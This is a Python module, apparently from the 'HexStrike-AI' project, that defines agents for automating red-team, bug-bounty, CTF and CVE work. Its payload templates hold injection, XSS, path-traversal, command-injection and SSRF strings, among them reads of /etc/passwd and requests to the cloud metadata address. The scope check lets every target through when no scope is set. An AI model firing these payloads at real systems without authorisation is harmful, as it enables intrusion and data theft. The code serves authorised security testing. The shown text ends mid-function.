"""
HexStrike-AI Specialized Agents
Advanced AI agents for intelligent red team automation, bug bounty workflows,
CTF solving, CVE intelligence, and adaptive security operations.
"""

import asyncio
import time
import re
from dataclasses import dataclass, field
from datetime import datetime
from typing import Any, Optional

from . import Agent, AgentConfig, AgentState, Thought, Tool, ToolResult, Guardrail

import logging

logger = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# 1. IntelligentDecisionEngine
# ---------------------------------------------------------------------------

@dataclass
class IntelligentDecisionEngine(Agent):
    """Analyzes task context and selects optimal tools/parameters.

    Maintains a strategy map that scores available tools against the current
    task so the orchestrator can always pick the best-fit tool automatically.
    """

    strategy_map: dict = field(default_factory=lambda: {
        "recon": {
            "keywords": ["scan", "discover", "enumerate", "fingerprint", "recon"],
            "preferred_tools": ["nmap", "subfinder", "amass", "httpx"],
            "weight": 1.0,
        },
        "exploit": {
            "keywords": ["exploit", "payload", "attack", "rce", "injection"],
            "preferred_tools": ["sqlmap", "metasploit", "nuclei"],
            "weight": 0.9,
        },
        "vuln_scan": {
            "keywords": ["vulnerability", "cve", "weakness", "audit"],
            "preferred_tools": ["nuclei", "nikto", "openvas"],
            "weight": 0.85,
        },
        "osint": {
            "keywords": ["osint", "intelligence", "email", "social", "dns"],
            "preferred_tools": ["theHarvester", "dnsx", "whois"],
            "weight": 0.8,
        },
        "brute": {
            "keywords": ["brute", "password", "credential", "login", "fuzz"],
            "preferred_tools": ["ffuf", "hydra", "gobuster"],
            "weight": 0.75,
        },
    })

    def _score_tool(self, tool_name: str, task_text: str) -> float:
        """Score a tool against the current task text (0.0 – 1.0)."""
        task_lower = task_text.lower()
        best_score = 0.0
        for _strategy, info in self.strategy_map.items():
            keyword_hits = sum(1 for kw in info["keywords"] if kw in task_lower)
            if keyword_hits == 0:
                continue
            keyword_ratio = keyword_hits / len(info["keywords"])
            tool_bonus = 0.3 if tool_name in info["preferred_tools"] else 0.0
            score = (keyword_ratio * info["weight"]) + tool_bonus
            best_score = max(best_score, min(score, 1.0))
        return round(best_score, 3)

    def select_tool(self, task_text: str, available_tools: list[str] | None = None) -> dict:
        """Return tools ranked by relevance to *task_text*.

        Returns a dict ``{"ranked": [{"tool": ..., "score": ...}, ...], "best": ...}``.
        """
        tools = available_tools or list(self.tool_registry.keys())
        scored = [{"tool": t, "score": self._score_tool(t, task_text)} for t in tools]
        scored.sort(key=lambda x: x["score"], reverse=True)
        return {"ranked": scored, "best": scored[0]["tool"] if scored else None}

    async def _reason(self, prompt: str) -> str:
        selection = self.select_tool(prompt)
        self.context["tool_selection"] = selection
        best = selection.get("best", "none")
        return (
            f"Analyzed task against {len(self.strategy_map)} strategies. "
            f"Best tool candidate: {best}"
        )

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        selection = self.context.get("tool_selection", {})
        best = selection.get("best")
        if best and best in self.tool_registry:
            return best, {"prompt": prompt}
        return None, {}

    async def execute(self, context: dict) -> dict:
        """Public execution entry-point used by higher-level orchestrators."""
        self.context.update(context)
        task = context.get("task", "")
        thought = await self.think(task)
        return {
            "status": "completed" if thought.state != AgentState.ERROR else "error",
            "findings": self.context.get("tool_selection", {}),
            "recommendations": [
                f"Use {self.context.get('tool_selection', {}).get('best', 'manual')} for this task"
            ],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 2. BugBountyWorkflowManager
# ---------------------------------------------------------------------------

@dataclass
class BugBountyWorkflowManager(Agent):
    """Manages end-to-end bug bounty hunting workflows.

    Phases: recon → subdomain_enum → content_discovery → vuln_scan → exploit_validation.
    Tracks scope boundaries and accumulated findings.
    """

    PHASES: list = field(default_factory=lambda: [
        "recon", "subdomain_enum", "content_discovery", "vuln_scan", "exploit_validation",
    ])

    phase_tools: dict = field(default_factory=lambda: {
        "recon": ["amass", "subfinder", "theHarvester"],
        "subdomain_enum": ["subfinder", "dnsx", "httpx"],
        "content_discovery": ["ffuf", "gobuster", "feroxbuster"],
        "vuln_scan": ["nuclei", "nikto", "sqlmap"],
        "exploit_validation": ["curl", "sqlmap", "nuclei"],
    })

    scope: list = field(default_factory=list)
    findings: list = field(default_factory=list)

    def _current_phase(self) -> str:
        return self.context.get("phase", self.PHASES[0])

    def _advance_phase(self) -> str:
        idx = self.PHASES.index(self._current_phase())
        next_idx = min(idx + 1, len(self.PHASES) - 1)
        self.context["phase"] = self.PHASES[next_idx]
        return self.context["phase"]

    def is_in_scope(self, target: str) -> bool:
        if not self.scope:
            return True
        return any(scope_item in target for scope_item in self.scope)

    async def _reason(self, prompt: str) -> str:
        phase = self._current_phase()
        tools = self.phase_tools.get(phase, [])
        return (
            f"Bug-bounty phase: {phase}. "
            f"Recommended tools: {', '.join(tools)}. "
            f"Findings so far: {len(self.findings)}."
        )

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        phase = self._current_phase()
        tools = self.phase_tools.get(phase, [])
        for tool in tools:
            if tool in self.tool_registry:
                return tool, {"target": self.context.get("target", ""), "phase": phase}
        return None, {}

    async def _act(self, action: str, params: dict) -> str:
        target = params.get("target", "")
        if target and not self.is_in_scope(target):
            return f"Target {target} is out of scope – skipping."
        result = await super()._act(action, params)
        self._advance_phase()
        return result

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        if "scope" in context:
            self.scope = context["scope"]

        task = context.get("task", "")
        thought = await self.think(task)

        return {
            "status": "completed",
            "phase": self._current_phase(),
            "findings": self.findings,
            "recommendations": [
                f"Proceed to phase: {self._current_phase()}",
                "Review findings before exploitation",
            ],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 3. CTFWorkflowManager
# ---------------------------------------------------------------------------

@dataclass
class CTFWorkflowManager(Agent):
    """Manages CTF challenge solving across multiple categories.

    Categorises challenges and applies per-category solve strategies.
    """

    CATEGORIES: dict = field(default_factory=lambda: {
        "web": {
            "indicators": ["http", "url", "cookie", "session", "xss", "sql", "html"],
            "strategies": [
                "Inspect HTTP headers and cookies",
                "Check for SQL injection points",
                "Look for directory traversal / LFI",
                "Test for XSS and SSTI",
            ],
        },
        "crypto": {
            "indicators": ["cipher", "encrypt", "decrypt", "rsa", "aes", "base64", "hash"],
            "strategies": [
                "Identify the cipher/algorithm",
                "Check for weak key sizes",
                "Look for known-plaintext attacks",
                "Try frequency analysis",
            ],
        },
        "pwn": {
            "indicators": ["binary", "buffer", "overflow", "rop", "shellcode", "elf"],
            "strategies": [
                "Check binary protections (checksec)",
                "Look for buffer overflow / format string bugs",
                "Build ROP chain if NX enabled",
                "Test for use-after-free",
            ],
        },
        "forensics": {
            "indicators": ["pcap", "memory", "disk", "image", "carve", "steganography"],
            "strategies": [
                "Analyze file headers / magic bytes",
                "Extract embedded files (binwalk)",
                "Inspect packet captures with tshark",
                "Check for hidden data in images",
            ],
        },
        "misc": {
            "indicators": [],
            "strategies": ["Read the challenge description carefully", "Try common encodings"],
        },
    })

    def classify_challenge(self, description: str) -> str:
        desc_lower = description.lower()
        scores: dict[str, int] = {}
        for cat, info in self.CATEGORIES.items():
            scores[cat] = sum(1 for ind in info["indicators"] if ind in desc_lower)
        if not scores:
            return "misc"
        best = max(scores, key=scores.get)  # type: ignore[arg-type]
        return best if scores[best] > 0 else "misc"

    def get_strategies(self, category: str) -> list[str]:
        return self.CATEGORIES.get(category, self.CATEGORIES["misc"])["strategies"]

    async def _reason(self, prompt: str) -> str:
        category = self.classify_challenge(prompt)
        self.context["category"] = category
        strategies = self.get_strategies(category)
        self.context["strategies"] = strategies
        return (
            f"Challenge classified as '{category}'. "
            f"Applying {len(strategies)} strategies."
        )

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        category = self.context.get("category", "misc")
        action_map = {
            "web": "scan_vulnerabilities",
            "crypto": "analyze_crypto",
            "pwn": "analyze_binary",
            "forensics": "analyze_forensics",
            "misc": "analyze_environment",
        }
        action = action_map.get(category, "analyze_environment")
        if action in self.tool_registry:
            return action, {"prompt": prompt, "category": category}
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        task = context.get("task", context.get("challenge", ""))
        thought = await self.think(task)
        category = self.context.get("category", "misc")
        return {
            "status": "completed",
            "category": category,
            "strategies": self.get_strategies(category),
            "findings": self.context.get("findings", []),
            "recommendations": self.get_strategies(category)[:2],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 4. CVEIntelligenceManager
# ---------------------------------------------------------------------------

@dataclass
class CVEIntelligenceManager(Agent):
    """Manages vulnerability intelligence – lookup, severity tracking, exploit suggestions.

    Keeps an in-memory CVE cache to avoid redundant look-ups.
    """

    cve_cache: dict = field(default_factory=dict)

    SEVERITY_ORDER: dict = field(default_factory=lambda: {
        "critical": 4, "high": 3, "medium": 2, "low": 1, "none": 0,
    })

    COMMON_CVE_DB: dict = field(default_factory=lambda: {
        "CVE-2021-44228": {
            "name": "Log4Shell",
            "severity": "critical",
            "cvss": 10.0,
            "affected": "Apache Log4j 2.x < 2.15.0",
            "exploit_type": "rce",
            "description": "Remote code execution via JNDI lookup in log messages",
        },
        "CVE-2023-44487": {
            "name": "HTTP/2 Rapid Reset",
            "severity": "high",
            "cvss": 7.5,
            "affected": "Multiple HTTP/2 implementations",
            "exploit_type": "dos",
            "description": "Denial of service via rapid stream reset",
        },
        "CVE-2021-34527": {
            "name": "PrintNightmare",
            "severity": "critical",
            "cvss": 8.8,
            "affected": "Windows Print Spooler",
            "exploit_type": "rce",
            "description": "RCE/LPE via Windows Print Spooler service",
        },
        "CVE-2023-23397": {
            "name": "Outlook Privilege Escalation",
            "severity": "critical",
            "cvss": 9.8,
            "affected": "Microsoft Outlook",
            "exploit_type": "privilege_escalation",
            "description": "NTLM credential theft via crafted email",
        },
        "CVE-2024-3094": {
            "name": "XZ Utils Backdoor",
            "severity": "critical",
            "cvss": 10.0,
            "affected": "xz-utils 5.6.0/5.6.1",
            "exploit_type": "backdoor",
            "description": "Supply-chain backdoor in xz compression library",
        },
    })

    def lookup_cve(self, cve_id: str) -> Optional[dict]:
        """Look up a CVE by its identifier, checking cache first."""
        cve_upper = cve_id.upper()
        if cve_upper in self.cve_cache:
            return self.cve_cache[cve_upper]
        entry = self.COMMON_CVE_DB.get(cve_upper)
        if entry:
            self.cve_cache[cve_upper] = entry
        return entry

    def search_cves(self, keyword: str) -> list[dict]:
        """Search CVEs by keyword across names, descriptions and affected products."""
        kw = keyword.lower()
        results = []
        for cve_id, info in self.COMMON_CVE_DB.items():
            searchable = f"{cve_id} {info['name']} {info['description']} {info['affected']}".lower()
            if kw in searchable:
                results.append({"cve_id": cve_id, **info})
        results.sort(key=lambda c: self.SEVERITY_ORDER.get(c["severity"], 0), reverse=True)
        return results

    def suggest_exploits(self, cve_id: str) -> list[str]:
        entry = self.lookup_cve(cve_id)
        if not entry:
            return []
        exploit_suggestions: dict[str, list[str]] = {
            "rce": ["Craft JNDI/payload string", "Use Metasploit module", "Write custom PoC"],
            "dos": ["Send malformed requests", "Use HTTP/2 rapid-reset script"],
            "privilege_escalation": ["Extract NTLM hash", "Relay credentials"],
            "backdoor": ["Check library version", "Inspect build artifacts"],
        }
        return exploit_suggestions.get(entry.get("exploit_type", ""), ["Manual analysis required"])

    async def _reason(self, prompt: str) -> str:
        cve_matches = re.findall(r'CVE-\d{4}-\d{4,}', prompt, re.IGNORECASE)
        self.context["cve_ids"] = [c.upper() for c in cve_matches]
        if cve_matches:
            return f"Found CVE references: {', '.join(cve_matches)}. Will look up intelligence."
        return "No explicit CVE IDs found – will search by keywords."

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        if self.context.get("cve_ids"):
            return "lookup_cve", {"cve_ids": self.context["cve_ids"]}
        return "search_cves", {"keyword": prompt[:80]}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        task = context.get("task", "")
        thought = await self.think(task)

        cve_results = []
        for cve_id in self.context.get("cve_ids", []):
            info = self.lookup_cve(cve_id)
            if info:
                cve_results.append({
                    "cve_id": cve_id,
                    **info,
                    "exploit_suggestions": self.suggest_exploits(cve_id),
                })

        if not cve_results:
            cve_results = self.search_cves(task)

        return {
            "status": "completed",
            "findings": cve_results,
            "cache_size": len(self.cve_cache),
            "recommendations": [
                f"Prioritise {r.get('cve_id', 'N/A')} ({r.get('severity', 'unknown')})"
                for r in cve_results[:3]
            ],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 5. AIExploitGenerator
# ---------------------------------------------------------------------------

@dataclass
class AIExploitGenerator(Agent):
    """Generates exploit code / payloads based on discovered vulnerabilities.

    Ships with templates for common exploit types that are populated with
    target-specific details at generation time.
    """

    TEMPLATES: dict = field(default_factory=lambda: {
        "sqli": {
            "name": "SQL Injection",
            "payloads": [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,NULL,NULL --",
                "1; WAITFOR DELAY '0:0:5' --",
                "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables)) --",
            ],
            "description": "Classic SQL injection test payloads",
        },
        "xss": {
            "name": "Cross-Site Scripting",
            "payloads": [
                "<script>alert(document.domain)</script>",
                "<img src=x onerror=alert(1)>",
                "'\"><svg/onload=alert(1)>",
                "javascript:alert(document.cookie)",
            ],
            "description": "XSS detection payloads",
        },
        "ssti": {
            "name": "Server-Side Template Injection",
            "payloads": [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "#{7*7}",
            ],
            "description": "SSTI detection probes across template engines",
        },
        "lfi": {
            "name": "Local File Inclusion",
            "payloads": [
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "/etc/passwd%00",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "description": "LFI path traversal payloads",
        },
        "rce": {
            "name": "Remote Code Execution",
            "payloads": [
                "; id",
                "| whoami",
                "`cat /etc/passwd`",
                "$(sleep 5)",
            ],
            "description": "OS command injection payloads",
        },
        "ssrf": {
            "name": "Server-Side Request Forgery",
            "payloads": [
                "http://127.0.0.1:80",
                "http://169.254.169.254/latest/meta-data/",
                "http://[::1]:80/",
                "http://0x7f000001/",
            ],
            "description": "SSRF probing payloads for internal access",
        },
    })

    def generate_payloads(self, vuln_type: str, target: str = "") -> dict:
        """Return payloads for the given vulnerability type, optionally tailored to *target*."""
        template = self.TEMPLATES.get(vuln_type.lower())
        if not template:
            return {"error": f"Unknown vulnerability type: {vuln_type}"}
        payloads = list(template["payloads"])
        if target:
            payloads = [p.replace("TARGET", target) for p in payloads]
        return {
            "vuln_type": vuln_type,
            "name": template["name"],
            "description": template["description"],
            "payloads": payloads,
            "count": len(payloads),
        }

    def detect_vuln_type(self, description: str) -> str:
        desc_lower = description.lower()
        type_keywords = {
            "sqli": ["sql", "injection", "database", "query"],
            "xss": ["xss", "cross-site", "script", "reflected", "stored"],
            "ssti": ["template", "ssti", "jinja", "twig"],
            "lfi": ["lfi", "file inclusion", "traversal", "path"],
            "rce": ["rce", "command", "exec", "remote code"],
            "ssrf": ["ssrf", "request forgery", "internal"],
        }
        best_type, best_score = "rce", 0
        for vtype, keywords in type_keywords.items():
            score = sum(1 for kw in keywords if kw in desc_lower)
            if score > best_score:
                best_type, best_score = vtype, score
        return best_type  # defaults to "rce" when no keywords match

    async def _reason(self, prompt: str) -> str:
        vuln_type = self.detect_vuln_type(prompt)
        self.context["vuln_type"] = vuln_type
        return f"Detected vulnerability class: {vuln_type}. Preparing payloads."

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        vuln_type = self.context.get("vuln_type", "rce")
        target = self.context.get("target", "")
        return "generate_payload", {"vuln_type": vuln_type, "target": target}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        task = context.get("task", "")
        thought = await self.think(task)
        vuln_type = self.context.get("vuln_type", "rce")
        payload_data = self.generate_payloads(vuln_type, context.get("target", ""))
        return {
            "status": "completed",
            "findings": payload_data,
            "recommendations": [
                "Test payloads in a controlled environment",
                "Verify scope before sending payloads",
            ],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 6. VulnerabilityCorrelator
# ---------------------------------------------------------------------------

@dataclass
class VulnerabilityCorrelator(Agent):
    """Correlates vulnerabilities across scan results to discover attack chains.

    Builds a lightweight attack graph where nodes are vulnerabilities and edges
    represent chaining opportunities.
    """

    attack_graph: dict = field(default_factory=lambda: {"nodes": [], "edges": []})

    CHAIN_RULES: list = field(default_factory=lambda: [
        {"from_type": "ssrf", "to_type": "lfi", "label": "SSRF to internal file read"},
        {"from_type": "sqli", "to_type": "rce", "label": "SQLi to OS command via xp_cmdshell / INTO OUTFILE"},
        {"from_type": "lfi", "to_type": "rce", "label": "LFI to RCE via log poisoning"},
        {"from_type": "xss", "to_type": "session_hijack", "label": "XSS to session hijacking"},
        {"from_type": "ssti", "to_type": "rce", "label": "SSTI to RCE via template engine"},
        {"from_type": "idor", "to_type": "data_leak", "label": "IDOR to sensitive data exposure"},
        {"from_type": "open_redirect", "to_type": "phishing", "label": "Open redirect to credential phishing"},
        {"from_type": "privilege_escalation", "to_type": "rce", "label": "PrivEsc to full system access"},
    ])

    def add_vulnerability(self, vuln_id: str, vuln_type: str, details: dict | None = None) -> None:
        node = {"id": vuln_id, "type": vuln_type, "details": details or {}}
        self.attack_graph["nodes"].append(node)
        self._update_edges()

    def _update_edges(self) -> None:
        """Re-evaluate chaining edges based on current vulnerability nodes."""
        node_types = {n["id"]: n["type"] for n in self.attack_graph["nodes"]}
        new_edges: list[dict] = []
        for rule in self.CHAIN_RULES:
            sources = [nid for nid, ntype in node_types.items() if ntype == rule["from_type"]]
            targets = [nid for nid, ntype in node_types.items() if ntype == rule["to_type"]]
            for src in sources:
                for tgt in targets:
                    if src != tgt:
                        new_edges.append({"from": src, "to": tgt, "label": rule["label"]})
        self.attack_graph["edges"] = new_edges

    def get_attack_chains(self) -> list[dict]:
        return self.attack_graph["edges"]

    def get_critical_paths(self) -> list[dict]:
        """Return edges that lead to RCE or data-leak – the most impactful chains."""
        critical_targets = {"rce", "data_leak", "session_hijack"}
        node_types = {n["id"]: n["type"] for n in self.attack_graph["nodes"]}
        return [
            e for e in self.attack_graph["edges"]
            if node_types.get(e["to"]) in critical_targets
        ]

    async def _reason(self, prompt: str) -> str:
        n_nodes = len(self.attack_graph["nodes"])
        n_edges = len(self.attack_graph["edges"])
        return f"Correlating {n_nodes} vulnerabilities. {n_edges} chaining edges found."

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        vulns = context.get("vulnerabilities", [])
        for v in vulns:
            self.add_vulnerability(v.get("id", ""), v.get("type", ""), v)

        thought = await self.think(context.get("task", "correlate"))
        chains = self.get_attack_chains()
        critical = self.get_critical_paths()
        return {
            "status": "completed",
            "findings": {
                "attack_graph": self.attack_graph,
                "chains": chains,
                "critical_paths": critical,
            },
            "recommendations": [
                f"Found {len(critical)} critical attack chain(s) – remediate first"
            ] if critical else ["No critical chains detected"],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 7. TechnologyDetector
# ---------------------------------------------------------------------------

@dataclass
class TechnologyDetector(Agent):
    """Identifies technology stacks from scan data and maps them to known vulnerabilities."""

    TECH_SIGNATURES: dict = field(default_factory=lambda: {
        "apache": {
            "patterns": ["apache", "httpd"],
            "category": "web_server",
            "known_vulns": ["CVE-2021-41773", "CVE-2021-42013"],
        },
        "nginx": {
            "patterns": ["nginx"],
            "category": "web_server",
            "known_vulns": ["CVE-2021-23017"],
        },
        "wordpress": {
            "patterns": ["wordpress", "wp-content", "wp-admin", "wp-includes"],
            "category": "cms",
            "known_vulns": ["CVE-2022-21661", "CVE-2023-2745"],
        },
        "django": {
            "patterns": ["django", "csrfmiddlewaretoken"],
            "category": "framework",
            "known_vulns": ["CVE-2023-36053"],
        },
        "react": {
            "patterns": ["react", "__react", "reactdom"],
            "category": "frontend",
            "known_vulns": [],
        },
        "php": {
            "patterns": [".php", "x-powered-by: php", "phpsessid"],
            "category": "language",
            "known_vulns": ["CVE-2024-4577"],
        },
        "java": {
            "patterns": ["java", "jsessionid", "tomcat", "spring"],
            "category": "language",
            "known_vulns": ["CVE-2022-22965", "CVE-2021-44228"],
        },
        "express": {
            "patterns": ["express", "x-powered-by: express"],
            "category": "framework",
            "known_vulns": [],
        },
        "iis": {
            "patterns": ["microsoft-iis", "asp.net", "aspnet"],
            "category": "web_server",
            "known_vulns": ["CVE-2023-36899"],
        },
    })

    detected_stack: list = field(default_factory=list)

    def detect(self, raw_data: str) -> list[dict]:
        """Scan *raw_data* (headers, HTML, etc.) for technology signatures."""
        data_lower = raw_data.lower()
        results: list[dict] = []
        for tech, info in self.TECH_SIGNATURES.items():
            matches = [p for p in info["patterns"] if p in data_lower]
            if matches:
                results.append({
                    "technology": tech,
                    "category": info["category"],
                    "matched_patterns": matches,
                    "known_vulns": info["known_vulns"],
                    "confidence": min(len(matches) / len(info["patterns"]), 1.0),
                })
        self.detected_stack = results
        return results

    async def _reason(self, prompt: str) -> str:
        detections = self.detect(prompt)
        self.context["detected_stack"] = detections
        techs = [d["technology"] for d in detections]
        return f"Detected technologies: {', '.join(techs) or 'none'}."

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        raw = context.get("raw_data", context.get("task", ""))
        thought = await self.think(raw)
        stack = self.context.get("detected_stack", [])
        all_vulns = []
        for tech in stack:
            all_vulns.extend(tech.get("known_vulns", []))
        return {
            "status": "completed",
            "findings": {"stack": stack, "associated_cves": list(set(all_vulns))},
            "recommendations": [
                f"Investigate {tech['technology']} for {len(tech['known_vulns'])} known CVEs"
                for tech in stack if tech["known_vulns"]
            ] or ["No known CVEs for detected stack"],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 8. RateLimitDetector
# ---------------------------------------------------------------------------

@dataclass
class RateLimitDetector(Agent):
    """Detects and adapts to rate limiting on target systems.

    Tracks response timing and HTTP status codes to infer rate-limit thresholds,
    then recommends adjusted request rates.
    """

    response_log: list = field(default_factory=list)
    current_delay: float = 0.1
    max_delay: float = 30.0
    min_delay: float = 0.05
    rate_limit_detected: bool = False
    backoff_multiplier: float = 2.0

    RATE_LIMIT_INDICATORS: list = field(default_factory=lambda: [
        429,   # Too Many Requests
        503,   # Service Unavailable (sometimes used for throttling)
    ])

    RATE_LIMIT_HEADERS: list = field(default_factory=lambda: [
        "x-ratelimit-remaining",
        "retry-after",
        "x-rate-limit-limit",
    ])

    def record_response(self, status_code: int, headers: dict | None = None,
                        response_time: float = 0.0) -> dict:
        """Record an HTTP response and return rate-limit assessment."""
        entry = {
            "timestamp": datetime.now().isoformat(),
            "status_code": status_code,
            "response_time": response_time,
            "headers": headers or {},
        }
        self.response_log.append(entry)

        assessment = {"rate_limited": False, "action": "continue", "recommended_delay": self.current_delay}

        if status_code in self.RATE_LIMIT_INDICATORS:
            self.rate_limit_detected = True
            self.current_delay = min(self.current_delay * self.backoff_multiplier, self.max_delay)
            retry_after = (headers or {}).get("retry-after")
            if retry_after is not None and isinstance(retry_after, str) and retry_after.isdigit():
                self.current_delay = max(self.current_delay, float(retry_after))
            assessment.update({
                "rate_limited": True,
                "action": "back_off",
                "recommended_delay": self.current_delay,
            })
        elif self.rate_limit_detected and status_code < 400:
            # Gradually ease back after rate-limit clears
            self.current_delay = max(self.current_delay / self.backoff_multiplier, self.min_delay)
            assessment["action"] = "easing"
            assessment["recommended_delay"] = self.current_delay

        remaining = (headers or {}).get("x-ratelimit-remaining")
        try:
            if remaining is not None and int(remaining) < 10:
                self.current_delay = min(self.current_delay * 1.5, self.max_delay)
                assessment["action"] = "preemptive_slow"
                assessment["recommended_delay"] = self.current_delay
        except (ValueError, TypeError):
            pass

        return assessment

    def get_stats(self) -> dict:
        total = len(self.response_log)
        limited = sum(1 for r in self.response_log if r["status_code"] in self.RATE_LIMIT_INDICATORS)
        avg_time = (
            sum(r["response_time"] for r in self.response_log) / total if total else 0.0
        )
        return {
            "total_requests": total,
            "rate_limited_count": limited,
            "average_response_time": round(avg_time, 4),
            "current_delay": self.current_delay,
            "rate_limit_detected": self.rate_limit_detected,
        }

    async def _reason(self, prompt: str) -> str:
        stats = self.get_stats()
        return (
            f"Requests: {stats['total_requests']}, rate-limited: {stats['rate_limited_count']}. "
            f"Current delay: {stats['current_delay']:.2f}s."
        )

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        responses = context.get("responses", [])
        assessments = []
        for resp in responses:
            a = self.record_response(
                status_code=resp.get("status_code", 200),
                headers=resp.get("headers"),
                response_time=resp.get("response_time", 0.0),
            )
            assessments.append(a)

        thought = await self.think(context.get("task", "rate-limit check"))
        stats = self.get_stats()
        return {
            "status": "completed",
            "findings": {"stats": stats, "assessments": assessments},
            "recommendations": [
                f"Current recommended delay: {self.current_delay:.2f}s between requests",
                "Back-off detected – reduce request rate" if self.rate_limit_detected else "No rate limit detected",
            ],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 9. FailureRecoverySystem
# ---------------------------------------------------------------------------

@dataclass
class FailureRecoverySystem(Agent):
    """Handles tool failures, retries, and fallback strategies.

    Maintains a health register for each known tool and provides automatic
    retry with exponential back-off plus fallback tool suggestions.
    """

    tool_health: dict = field(default_factory=dict)
    max_retries: int = 3
    retry_base_delay: float = 1.0

    FALLBACK_MAP: dict = field(default_factory=lambda: {
        "nmap": ["masscan", "rustscan"],
        "sqlmap": ["ghauri", "manual_sqli"],
        "ffuf": ["gobuster", "feroxbuster", "dirsearch"],
        "nuclei": ["nikto", "zap"],
        "subfinder": ["amass", "dnsx"],
        "nikto": ["nuclei", "zap"],
        "amass": ["subfinder", "dnsx"],
        "hydra": ["medusa", "ncrack"],
    })

    def _ensure_health_entry(self, tool_name: str) -> None:
        if tool_name not in self.tool_health:
            self.tool_health[tool_name] = {
                "status": "healthy",
                "consecutive_failures": 0,
                "total_failures": 0,
                "total_successes": 0,
                "last_error": None,
                "last_used": None,
            }

    def record_success(self, tool_name: str) -> None:
        self._ensure_health_entry(tool_name)
        h = self.tool_health[tool_name]
        h["status"] = "healthy"
        h["consecutive_failures"] = 0
        h["total_successes"] += 1
        h["last_used"] = datetime.now().isoformat()

    def record_failure(self, tool_name: str, error: str = "") -> dict:
        """Record a failure and return recovery recommendation."""
        self._ensure_health_entry(tool_name)
        h = self.tool_health[tool_name]
        h["consecutive_failures"] += 1
        h["total_failures"] += 1
        h["last_error"] = error
        h["last_used"] = datetime.now().isoformat()

        if h["consecutive_failures"] >= self.max_retries:
            h["status"] = "degraded"
            fallbacks = self.FALLBACK_MAP.get(tool_name, [])
            healthy_fallbacks = [
                fb for fb in fallbacks
                if self.tool_health.get(fb, {}).get("status", "healthy") != "degraded"
            ]
            return {
                "action": "fallback",
                "tool": tool_name,
                "fallbacks": healthy_fallbacks,
                "reason": f"{tool_name} failed {h['consecutive_failures']} times consecutively",
            }

        delay = self.retry_base_delay * (2 ** (h["consecutive_failures"] - 1))
        return {
            "action": "retry",
            "tool": tool_name,
            "delay": delay,
            "attempt": h["consecutive_failures"],
            "max_retries": self.max_retries,
        }

    def get_fallbacks(self, tool_name: str) -> list[str]:
        return self.FALLBACK_MAP.get(tool_name, [])

    def get_health_report(self) -> dict:
        return dict(self.tool_health)

    async def _reason(self, prompt: str) -> str:
        degraded = [t for t, h in self.tool_health.items() if h["status"] == "degraded"]
        return (
            f"Monitoring {len(self.tool_health)} tools. "
            f"Degraded: {', '.join(degraded) or 'none'}."
        )

    async def _decide_action(self, prompt: str) -> tuple[Optional[str], dict]:
        return None, {}

    async def execute(self, context: dict) -> dict:
        self.context.update(context)
        events = context.get("events", [])
        recommendations: list[str] = []
        for event in events:
            tool = event.get("tool", "")
            if event.get("success"):
                self.record_success(tool)
            else:
                rec = self.record_failure(tool, event.get("error", ""))
                if rec["action"] == "fallback":
                    recommendations.append(
                        f"Switch from {tool} to {rec['fallbacks'][0] if rec['fallbacks'] else 'manual'}"
                    )
                else:
                    recommendations.append(f"Retry {tool} in {rec['delay']:.1f}s (attempt {rec['attempt']})")

        thought = await self.think(context.get("task", "failure recovery"))
        return {
            "status": "completed",
            "findings": self.get_health_report(),
            "recommendations": recommendations or ["All tools healthy"],
            "thought_trace": thought.to_dict(),
        }


# ---------------------------------------------------------------------------
# 10. PerformanceMonitor
# ---------------------------------------------------------------------------

@dataclass
class PerformanceMonitor(Agent):
    """Monitors agent/tool execution times, success rates, and resource usage."""

    metrics: dict = field(default_factory=lambda: {
        "executions": [],
        "agent_stats": {},
    })

    def record_execution(self, agent_name: str, duration: float, success: bool,
                         memory_mb: float = 0.0) -> None:
        entry = {
            "agent": agent_name,
            "duration": duration,
            "success": success,
            "memory_mb": memory_mb,
            "timestamp": datetime.now().isoformat(),
        }
        self.metrics["executions"].append(entry)

        if agent_name not in self.metrics["agent_stats"]:
            self.metrics["agent_stats"][agent_name] = {
                "total_runs": 0,
                "successes": 0,
                "total_duration": 0.0,
                "max_duration": 0.0,
                "peak_memory_mb": 0.0,
            }
        stats = self.metrics["agent_stats"][agent_name]
        stats["total_runs"] += 1
        stats["successes"] += int(success)
        stats["total_duration"] += duration
        stats["max_duration"] = max(stats["max_duration"], duration)
        stats["peak_memory_mb"] = max(stats["peak_memory_mb"], memory_mb)

    def get_agent_stats(self, agent_name: str) -> dict:
        stats = self.metrics["agent_stats"].get(agent_name)
        if not stats or stats["total_runs"] == 0:
            return {"error": f"No data for {agent_name}"}
        return {
            "agent": agent_name,
            "total_runs": stats["total_runs"],
